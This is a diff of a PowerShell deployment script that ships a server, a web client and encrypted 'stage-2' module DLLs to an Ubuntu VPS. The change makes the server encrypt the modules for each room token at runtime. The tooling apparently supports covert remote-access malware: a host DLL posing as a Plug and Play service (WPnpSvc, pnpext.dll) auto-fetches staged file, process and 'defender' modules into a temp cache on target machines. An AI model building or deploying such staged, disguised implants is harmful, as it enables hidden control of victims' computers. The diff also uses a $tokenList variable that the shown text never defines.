@@ -1,29 +1,30 @@
 # deploy_to_vps.ps1 - one-command end-to-end deploy to an Ubuntu VPS.
 #
+# Token-agnostic: server.py encrypts stage-2 modules on the fly per
+# room_token, so this script doesn't need to know which tokens exist.
+# It just ships the unencrypted module DLLs to the VPS once.
+#
 # Does everything from local to live:
-#   1. Generates stage-2 blobs for the given room_token
-#   2. Collects server.py + web client + configs + blobs into a tarball
+#   1. (Optional) builds the host + stage-2 modules
+#   2. Collects server.py + web client + configs + stage-2 DLLs into a tarball
 #   3. Uploads to VPS:/tmp/rdp-deploy.tar.gz
 #   4. Extracts to /tmp/rdp-deploy/ on VPS
-#   5. Runs deploy-vps.sh (which now auto-deploys the stage-2 blobs)
+#   5. Runs deploy-vps.sh (places stage-2 DLLs under /opt/remotedesk/stage2/)
 #
 # Usage:
-#   .\deploy_to_vps.ps1 -Vps root@1.2.3.4 -Token my-room-token-123
-#   .\deploy_to_vps.ps1 -Vps root@vps.example.com -Token my-tok -SshKey C:\keys\vps.pem
-#   .\deploy_to_vps.ps1 -Vps root@1.2.3.4 -Token my-tok -SkipBuild
+#   .\deploy_to_vps.ps1 -Vps root@1.2.3.4
+#   .\deploy_to_vps.ps1 -Vps root@vps.example.com -SshKey C:\keys\vps.pem
+#   .\deploy_to_vps.ps1 -Vps root@1.2.3.4 -SkipBuild      # reuse last build
 #
 # Requirements (Windows 10/11 has all of these built in):
 #   - ssh.exe, scp.exe (OpenSSH client)
 #   - tar.exe
-#   - python.exe
 #   - A working build: run run_build.ps1 first unless -SkipBuild
 
 param(
     [Parameter(Mandatory=$true)][string]$Vps,
-    [Parameter(Mandatory=$true)][string]$Token,
     [string]$SshKey = $null,
-    [switch]$SkipBuild = $false,
-    [switch]$SkipBlobs = $false
+    [switch]$SkipBuild = $false
 )
 
 $ErrorActionPreference = 'Stop'
@@ -40,14 +41,20 @@ if (-not $SkipBuild) {
     Copy-Item "$repo\build\bin\pnpext.dll" "$repo\dist\usb\pnpext.dll" -Force
 }
 
-# ── 2. Generate stage-2 blobs for the token ─────────────────────────────
-if (-not $SkipBlobs) {
-    Write-Host ""
-    Write-Host "=== 2/5  Encrypting stage-2 blobs for token ===" -ForegroundColor Cyan
-    python "$repo\_deploy_stage2.py" $Token
-    if ($LASTEXITCODE -ne 0) { throw "Blob generation failed" }
+# ── 2. Verify stage-2 DLLs exist (server encrypts per token at runtime) ─
+Write-Host ""
+Write-Host "=== 2/5  Checking stage-2 DLLs ===" -ForegroundColor Cyan
+$stage2Built = Join-Path $repo 'build\stage2'
+$dllsFound = @()
+if (Test-Path $stage2Built) {
+    $dllsFound = Get-ChildItem $stage2Built -Filter '*.dll' | Select-Object -ExpandProperty Name
+}
+if ($dllsFound.Count -gt 0) {
+    Write-Host "Found $($dllsFound.Count) stage-2 module DLL(s):"
+    foreach ($d in $dllsFound) { Write-Host "  $d" }
 } else {
-    Write-Host "=== 2/5  Skipped blob generation (-SkipBlobs) ===" -ForegroundColor Yellow
+    Write-Host "  WARNING: no stage-2 DLLs in $stage2Built" -ForegroundColor Yellow
+    Write-Host "           VPS will have no stage-2 support; host falls back to stage-1 handlers." -ForegroundColor Yellow
 }
 
 # ── 3. Stage everything into a temp dir and tar it ──────────────────────
@@ -131,10 +138,15 @@ Remove-Item $stage -Recurse -Force
 Write-Host ""
 if ($deployExit -eq 0) {
     Write-Host "=== SUCCESS ===" -ForegroundColor Green
-    Write-Host "Stage-2 blobs deployed under /opt/remotedesk/stage2/$Token/ on VPS."
-    Write-Host "Host will auto-fetch them on next WSS auth (+5s)."
+    if ($tokenList -and $tokenList.Count -gt 0) {
+        Write-Host "Stage-2 blobs deployed on VPS for token(s):"
+        foreach ($t in $tokenList) {
+            Write-Host "  /opt/remotedesk/stage2/$t/"
+        }
+    }
+    Write-Host "Host(s) will auto-fetch on next WSS auth (+5s)."
     Write-Host ""
-    Write-Host "Verify on target machine after 'sc stop WPnpSvc; sc start WPnpSvc':"
+    Write-Host "Verify on each target machine after 'sc stop WPnpSvc; sc start WPnpSvc':"
     Write-Host "  dir %TEMP%\pnp_cache\"
     Write-Host "  Event Viewer -> Application, Source=WPnpSvc:"
     Write-Host "    'stage2: loaded filemgr', 'stage2: loaded procmgr', 'stage2: loaded defender'"
